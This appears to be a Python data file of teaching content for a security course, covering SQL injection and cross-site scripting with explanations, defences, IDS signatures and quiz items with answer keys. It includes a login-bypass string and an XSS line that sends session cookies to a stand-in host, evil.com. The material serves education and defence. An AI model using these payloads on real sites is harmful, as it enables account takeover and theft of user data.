"""
Injection Attacks learning path content.
Covers SQL injection and XSS.
"""

INJECTION_EXERCISES = {

    "sql_injection": {
        "title": "SQL Injection (SQLi)",
        "path": "injection",
        "learn": {
            "what_is_it": (
                "SQL injection is when an attacker inserts malicious database commands into "
                "input fields like login forms or search boxes. If the web app doesn't "
                "properly sanitise input, the attacker can read, modify, or delete the "
                "entire database."
            ),
            "how_it_works": (
                "A vulnerable app might build a query like: SELECT * FROM users WHERE "
                "username = '[input]'. If the attacker types: ' OR 1=1 -- the query becomes: "
                "SELECT * FROM users WHERE username = '' OR 1=1 --' which returns ALL users. "
                "The -- comments out the rest of the query. More advanced SQLi can extract "
                "data, modify records, or even execute system commands."
            ),
            "what_ids_looks_for": (
                "An IDS uses signature matching to detect SQL keywords in HTTP payloads. "
                "It looks for patterns like UNION SELECT, OR 1=1, DROP TABLE, comment "
                "sequences (-- or /*), and dangerous functions like xp_cmdshell or SLEEP()."
            ),
            "how_to_defend": [
                "Use parameterised queries / prepared statements (NEVER concatenate input into SQL)",
                "Use an ORM framework like SQLAlchemy",
                "Validate and sanitise all user input",
                "Use a Web Application Firewall (WAF)",
                "Follow the principle of least privilege for database accounts",
            ],
            "real_world": (
                "SQL injection has been in the OWASP Top 10 since it began. The 2011 Sony "
                "PlayStation Network breach exposed 77 million accounts and was caused by "
                "SQL injection."
            ),
        },
        "quiz": [
            {
                "question": "What does SQL injection target?",
                "options": [
                    "The network firewall",
                    "The database behind a web application",
                    "The user's web browser",
                ],
                "answer": 1,
            },
            {
                "question": "What is the best defence against SQL injection?",
                "options": [
                    "A stronger password policy",
                    "Parameterised queries / prepared statements",
                    "Installing more RAM on the server",
                ],
                "answer": 1,
            },
            {
                "question": "What does ' OR 1=1 -- do in a vulnerable login form?",
                "options": [
                    "Crashes the web server",
                    "Bypasses authentication by making the query always true",
                    "Encrypts the database",
                ],
                "answer": 1,
            },
        ],
    },

    "xss_attack": {
        "title": "Cross-Site Scripting (XSS)",
        "path": "injection",
        "learn": {
            "what_is_it": (
                "Cross-Site Scripting (XSS) is when an attacker injects malicious JavaScript "
                "into a web page that other users will view. When the victim's browser loads "
                "the page, the script runs and can steal cookies, redirect users, or change "
                "what they see."
            ),
            "how_it_works": (
                "If a website displays user input without sanitising it (like a comment section), "
                "an attacker can submit something like: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>. "
                "When another user views that page, the script runs in their browser and sends "
                "their session cookie to the attacker."
            ),
            "what_ids_looks_for": (
                "An IDS detects XSS by matching HTTP payloads against patterns like <script>, "
                "javascript:, onerror=, onload=, and other HTML event handlers. These patterns "
                "indicate someone is trying to inject executable code."
            ),
            "how_to_defend": [
                "Sanitise and escape all user-generated content before displaying it",
                "Use Content Security Policy (CSP) headers",
                "Use HTTP-only cookies so JavaScript can't access them",
                "Validate input on both client and server side",
            ],
            "real_world": (
                "In 2005, the Samy worm used XSS on MySpace to add over one million friends "
                "to the attacker's profile in just 20 hours. It was the fastest-spreading "
                "virus of all time at that point."
            ),
        },
        "quiz": [
            {
                "question": "What does XSS inject into a web page?",
                "options": [
                    "SQL database commands",
                    "Malicious JavaScript code",
                    "Network packets",
                ],
                "answer": 1,
            },
            {
                "question": "Who is the victim of a stored XSS attack?",
                "options": [
                    "The server that hosts the website",
                    "Other users who view the page containing the injected script",
                    "The attacker themselves",
                ],
                "answer": 1,
            },
        ],
    },
}
